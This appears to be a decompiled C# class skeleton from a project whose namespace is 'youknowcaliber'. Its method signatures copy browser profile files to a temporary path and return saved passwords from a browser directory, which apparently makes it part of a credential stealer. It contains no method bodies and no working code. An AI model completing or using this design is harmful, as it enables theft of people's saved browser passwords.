using System.Collections.Generic;

namespace youknowcaliber.Passwords;

internal class Passwords
{
	private static string SystemDrive;

	private static string CopyTempPath;

	private static string[] RequiredFiles;

	private static extern string CopyRequiredFiles(string profile);

	public static extern List<Password> Get(string BrowserDir);

	public extern Passwords();
}
